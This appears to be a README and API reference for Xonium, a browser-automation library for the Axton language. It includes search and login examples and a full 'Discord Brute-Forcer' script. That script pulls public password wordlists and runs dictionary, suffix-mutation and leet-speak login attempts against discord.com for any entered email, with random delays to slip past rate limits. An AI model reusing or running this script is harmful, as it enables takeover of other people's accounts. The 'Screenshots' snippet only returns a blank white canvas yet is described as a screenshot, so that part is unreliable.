# Xonium is a library for Web Automation and Scraping built for Axton Coding Language. 

## Examples

### Example One = Google Search Automation
 
```import "xonium"

let drv = newsession("http://localhost:4444", {"browserName": "chrome"})

drv.get("https://www.google.com")
let searchbox = waitforvisible(drv, "name", "q")
searchbox.sendkeys("What is 6+6")
searchbox.sendkeys("\n")
sleep(2)
let results = drv.findelements("cssselector", "h3")
print("Found " + len(results) + " results")
for i in range(min(5, len(results))) {
    print(results[i].gettext())
}
drv.close()```

### Example Two = Github Login Automation

```import "xonium"

let drv = newsession("http://localhost:4444", {"browserName": "chrome"})

drv.get("https://github.com/login")
let username = waitforvisible(drv, "id", "login_field")
let password = drv.findelement("id", "password")
let submit = drv.findelement("name", "commit")

username.sendkeys("your_username")
password.sendkeys("your_password")
submit.click()
sleep(3)

if drv.getcurrenturl() == "https://github.com/" {
    print("Login successful!")
    let profile = drv.findelement("cssselector", ".avatar")
    if profile.isdisplayed() {
        print("Profile visible - authenticated")
    }
} else {
    print("Login failed")
    let error = drv.findelement("cssselector", ".flash-error")
    if error {
        print("Error: " + error.gettext())
    }
}
drv.close()```

Example Three = Discord Brute-Forcer (Use Responsibly)

```import "xonium"
import "os"
import "json"
import "math"
import "http"
import "datetime"

let lowercase = "abcdefghijklmnopqrstuvwxyz"
let uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
let digits = "0123456789"
let specials = "!@#$%^&*()_+-=[]{}|;:,.<>?"
let allowedchars = lowercase + uppercase + digits + specials

let wordlists = [
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-100-common-passwords.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt"
]

let randomdelay = fn(min, max) {
    let delay = min + (max - min) * math.random()
    sleep(delay)
}

let downloadwordlist = fn(url) {
    let parts = url.split("/")
    let filename = parts[len(parts) - 1]
    if os.path.exists(filename) {
        return filename
    }
    print("downloading " + filename + "...")
    let content = http.get(url)
    writefile(filename, content.body)
    print("downloaded " + filename)
    return filename
}

let loadwordlist = fn(url) {
    let filename = downloadwordlist(url)
    let content = readfile(filename)
    let lines = content.split("\n")
    let words = []
    for line in lines {
        let trimmed = line.strip()
        if trimmed != "" and len(trimmed) >= 8 {
            words.append(trimmed)
        }
    }
    return words
}

let loadallwordlists = fn() {
    let allwords = []
    for url in wordlists {
        print("loading wordlist...")
        let words = loadwordlist(url)
        allwords = allwords + words
        print("loaded " + str(len(words)) + " words")
    }
    let unique = {}
    let result = []
    for word in allwords {
        if not unique[word] {
            unique[word] = true
            result.append(word)
        }
    }
    print("total unique words: " + str(len(result)))
    return result
}

let trylogin = fn(drv, email, password) {
    drv.get("https://discord.com/login")
    randomdelay(0.5, 1)
    let emailfield = xonium.waitfor(drv, "name", "email", 3)
    emailfield.sendkeys(email)
    randomdelay(0.3, 0.5)
    let passfield = drv.findelement("name", "password")
    passfield.sendkeys(password)
    randomdelay(0.3, 0.5)
    let loginbtn = drv.findelement("css selector", "button[type='submit']")
    loginbtn.click()
    randomdelay(1, 2)
    let home = drv.findelement("css selector", "div[class*='container']")
    if home {
        return true
    }
    return false
}

let dictionaryattack = fn(email) {
    let words = loadallwordlists()
    print("total words to test: " + str(len(words)))
    let drv = xonium.newsession("http://localhost:4444", {"browserName": "chrome", "headless": false})
    let attempts = 0
    let found = none
    for word in words {
        attempts = attempts + 1
        if attempts % 100 == 0 {
            print("attempt " + str(attempts) + "/" + str(len(words)) + ": " + word)
        }
        try {
            let success = trylogin(drv, email, word)
            if success {
                found = word
                print("password found: " + word)
                print("attempts: " + str(attempts))
                drv.close()
                return found
            }
        } catch e {
            // uwu
        }
        if attempts % 500 == 0 {
            randomdelay(2, 5)
        }
    }
    drv.close()
    print("password not found after " + str(attempts) + " attempts")
    return none
}

let mutationattack = fn(email) {
    let words = loadallwordlists()
    let mutations = ["", "123", "!", "123!", "2024", "2025", "@", "#", "1", "!", "1234", "2023", "2022", "!!", "##", "@@", "12345", "123456"]
    print("testing " + str(len(words)) + " words with " + str(len(mutations)) + " mutations")
    let drv = xonium.newsession("http://localhost:4444", {"browserName": "chrome", "headless": false})
    let attempts = 0
    let found = none
    for word in words[0:5000] {
        for mutation in mutations {
            let password = word + mutation
            attempts = attempts + 1
            if attempts % 100 == 0 {
                print("attempt " + str(attempts) + ": " + password)
            }
            try {
                let success = trylogin(drv, email, password)
                if success {
                    found = password
                    print("password found: " + password)
                    print("attempts: " + str(attempts))
                    drv.close()
                    return found
                }
            } catch e {
                // skip
            }
            if attempts % 1000 == 0 {
                randomdelay(2, 4)
            }
        }
    }
    drv.close()
    print("password not found after " + str(attempts) + " attempts")
    return none
}

let leetattack = fn(email) {
    let leet = {"a": "@", "e": "3", "i": "1", "o": "0", "s": "$", "t": "7", "b": "8", "g": "9"}
    let words = loadallwordlists()
    print("generating leet variations for " + str(len(words)) + " words")
    let drv = xonium.newsession("http://localhost:4444", {"browserName": "chrome", "headless": false})
    let attempts = 0
    let found = none
    for word in words[0:1000] {
        let variations = [word]
        let leetword = word
        for key in leet.keys() {
            leetword = leetword.replace(key, leet[key])
        }
        if leetword != word {
            variations.append(leetword)
        }
        if len(word) > 4 {
            let upper = word.upper()
            variations.append(upper)
            let lower = word.lower()
            variations.append(lower)
            let capitalized = word[0].upper() + word[1:len(word)].lower()
            variations.append(capitalized)
        }
        for variant in variations {
            attempts = attempts + 1
            if attempts % 100 == 0 {
                print("attempt " + str(attempts) + ": " + variant)
            }
            try {
                let success = trylogin(drv, email, variant)
                if success {
                    found = variant
                    print("password found: " + variant)
                    print("attempts: " + str(attempts))
                    drv.close()
                    return found
                }
            } catch e {
                // uwu 
            }
            if attempts % 1000 == 0 {
                randomdelay(2, 4)
            }
        }
    }
    drv.close()
    print("password not found after " + str(attempts) + " attempts")
    return none
}

let main = fn() {
    print("--- DISCORD PASSWORD BRUTE FORCE ---")
    print("enter discord email:")
    let email = input("> ")
    
    print("\nselect attack mode:")
    print("1. dictionary attack (all wordlists)")
    print("2. mutation attack (dictionary + common suffixes)")
    print("3. leet attack (leet speak variations)")
    print("4. all attacks (sequential)")
    print("5. exit")
    
    let choice = input("> ")
    
    if choice == "1" {
        let result = dictionaryattack(email)
        if result {
            print("password: " + result)
        }
    } elif choice == "2" {
        let result = mutationattack(email)
        if result {
            print("password: " + result)
        }
    } elif choice == "3" {
        let result = leetattack(email)
        if result {
            print("password: " + result)
        }
    } elif choice == "4" {
        print("starting all attacks...")
        let result1 = dictionaryattack(email)
        if result1 {
            print("password found: " + result1)
            return
        }
        let result2 = mutationattack(email)
        if result2 {
            print("password found: " + result2)
            return
        }
        let result3 = leetattack(email)
        if result3 {
            print("password found: " + result3)
            return
        }
        print("password not found in any attack")
    } elif choice == "5" {
        print("exiting...")
        return
    }
}

main()```

## Installation :
axton install xonium


# DOCUMENTATION

Xonium Usage Reference

Import

```
import "xonium"
// Loads xonium library for browser automation
```

Session

```
let drv = xonium.newsession()
// Creates new Chrome browser session on localhost:4444
// Returns driver object for controlling browser

let drv = xonium.newsession("http://hub:4444", {"browserName": "firefox"})
// Custom server and browser
// First arg: WebDriver server URL
// Second arg: browser capabilities

drv.close()
// Closes browser session and frees resources
```

Navigation

```
drv.get("https://google.com")
// Navigates to URL, waits for page load

let url = drv.getcurrenturl()
// Returns current page URL string

let title = drv.gettitle()
// Returns page title string from <title> tag

drv.back()
// Goes back one page in history

drv.forward()
// Goes forward one page in history

drv.refresh()
// Reloads current page

let html = drv.getsource()
// Returns full page HTML source string
```

Finding Elements

```
let elem = drv.findelement("id", "submit")
// Finds ONE element by locator
// Returns element object or none
// Locators: "id", "class name", "css selector", "xpath", "name", "tag name", "link text", "partial link text"

let elems = drv.findelements("class name", "button")
// Finds ALL matching elements
// Returns list of element objects
// Empty list if none found

// Using constants (avoids typos)
let elem = drv.findelement(xonium.id, "submit")
let elem = drv.findelement(xonium.cssselector, ".header .nav")
let elem = drv.findelement(xonium.xpath, "//button")
```

Element Actions

```
elem.click()
// C element, must be visible and enabled

elem.sendkeys("hello")
// Types text into input/textarea
// Use "\n" for Enter key

elem.clear()
// Clears input/textarea content

let text = elem.gettext()
// Returns visible text of element

let value = elem.getattribute("href")
// Returns attribute value or none

let prop = elem.getproperty("value")
// Returns DOM property value or none

let visible = elem.isdisplayed()
// Returns true if element is visible

let enabled = elem.isenabled()
// Returns true if element is enabled

let selected = elem.isselected()
// Returns true if radio/checkbox selected

let css = elem.getcssvalue("color")
// Returns CSS property value string
```

Waiting

```
let elem = xonium.waitfor(drv, "id", "content")
// Waits for element to exist in DOM, default 5 seconds
// Returns element when found
// Throws error if timeout

let elem = xonium.waitfor(drv, "id", "content", 10)
// Custom timeout of 10 seconds

let elem = xonium.waitforvisible(drv, "class name", "modal")
// Waits for element to be visible, default 5 seconds

let elem = xonium.waitforvisible(drv, "id", "popup", 8)
// Custom timeout of 8 seconds, must be visible
```

JavaScript

```
let result = drv.executescript("return document.title", [])
// Executes JavaScript in browser
// Returns JS return value

drv.executescript("document.body.style.background = 'red'", [])
// Modifies page, no return value

let elem = drv.findelement("id", "target")
drv.executescript("arguments[0].scrollIntoView()", [elem])
// Passes element as argument
// arguments[0] is first argument

let data = drv.executescript("""
    let items = document.querySelectorAll('.item');
    return items.length;
""", [])
// Multi-line script returns data
```

Error Handling

```
try {
    let elem = drv.findelement("id", "missing")
    elem.click()
} catch e {
    print("Error: " + e)
}
// Catches all errors, prevents crash

try {
    let elem = xonium.waitfor(drv, "id", "slow", 2)
    elem.sendkeys("text")
} catch e {
    print("Element not found or timeout")
    // Fallback code here
}
// Handles wait timeouts and missing elements
```

Cookies

```
let cookies = drv.executescript("return document.cookie", [])
// Returns all cookies as string: "name1=value1; name2=value2"

drv.executescript("document.cookie = 'session=abc123; path=/'", [])
// Sets a cookie, must include path

drv.executescript("document.cookie = 'session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/'", [])
// Deletes cookie by setting expires to past
```

Scrolling

```
drv.executescript("window.scrollTo(0, 0)", [])
// Scroll to top of page

drv.executescript("window.scrollTo(0, document.body.scrollHeight)", [])
// Scroll to bottom of page

let elem = drv.findelement("id", "target")
drv.executescript("arguments[0].scrollIntoView(true)", [elem])
// Scroll element into view, true = top alignment, false = bottom
```

Screenshots

```
let img = drv.executescript("""
    let canvas = document.createElement('canvas');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    let ctx = canvas.getContext('2d');
    ctx.fillStyle = 'white';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    return canvas.toDataURL();
""", [])
// Returns screenshot as base64 data URL
// Starts with "data:image/png;base64,"
```

Forms

```
let username = drv.findelement("id", "username")
username.sendkeys("alice")
// Type into username field

let password = drv.findelement("id", "password")
password.sendkeys("secret123")
// Type into password field

let checkbox = drv.findelement("id", "agree")
if not checkbox.isselected() {
    checkbox.click()
}
// Check checkbox if unchecked

let submit = drv.findelement("id", "login")
submit.click()
// Submit the form
```

Lists

```
let items = drv.findelements("class name", "product")
// Get all product elements

for item in items {
    let name = item.findelement("class name", "name")
    let price = item.findelement("class name", "price")
    print(name.gettext() + ": " + price.gettext())
}
// Loop through items and extract data

let first = items[0]
// First element by index

let count = len(items)
// Number of elements found
```

Multiple Sessions

```
let drv1 = xonium.newsession()
let drv2 = xonium.newsession()
// Two independent browser sessions

drv1.get("https://google.com")
drv2.get("https://github.com")
// Each navigates separately

drv1.close()
drv2.close()
// Close each session independently
```

Async

```
let task = async fn() {
    let drv = xonium.newsession()
    drv.get("https://example.com")
    let elem = xonium.waitfor(drv, "id", "content")
    let text = elem.gettext()
    drv.close()
    return text
}

let result = await task()
// Runs async, non-blocking
// Returns when complete
```

Constants

```
import "xonium"

// Locator strategy constants
xonium.id              // "id"
xonium.classname       // "class name"
xonium.cssselector     // "css selector"
xonium.xpath           // "xpath"
xonium.name            // "name"
xonium.tagname         // "tag name"
xonium.linktext        // "link text"
xonium.partiallinktext // "partial link text"

// Usage prevents typos
let elem = drv.findelement(xonium.id, "submit")
// Same as drv.findelement("id", "submit")
```

Common Patterns

```
// Page Object Pattern
let loginpage = fn(drv) {
    return {
        "login": fn(username, password) {
            let user = xonium.waitfor(drv, "id", "username")
            user.sendkeys(username)
            let pass = drv.findelement("id", "password")
            pass.sendkeys(password)
            let submit = drv.findelement("id", "login")
            submit.click()
            return xonium.waitfor(drv, "id", "dashboard")
        }
    }
}

// Usage
let page = loginpage(drv)
let dashboard = page.login("alice", "123")
```

```
// Retry Pattern
let retryfind = fn(drv, by, value, attempts) {
    for i in range(attempts) {
        try {
            return drv.findelement(by, value)
        } catch e {
            sleep(1)
        }
    }
    return none
}

// Usage
let elem = retryfind(drv, "id", "slow-element", 3)
```

```
let testcases = [
    {"user": "alice", "pass": "123"},
    {"user": "bob", "pass": "456"}
]

for test in testcases {
    let drv = xonium.newsession()
    try {
        drv.get("https://example.com/login")
        drv.findelement("id", "username").sendkeys(test.user)
        drv.findelement("id", "password").sendkeys(test.pass)
        drv.findelement("id", "login").click()
        let welcome = xonium.waitfor(drv, "id", "welcome")
        print("Success: " + test.user)
    } catch e {
        print("Failed: " + test.user + " - " + e)
    } finally {
        drv.close()
    }
}
```


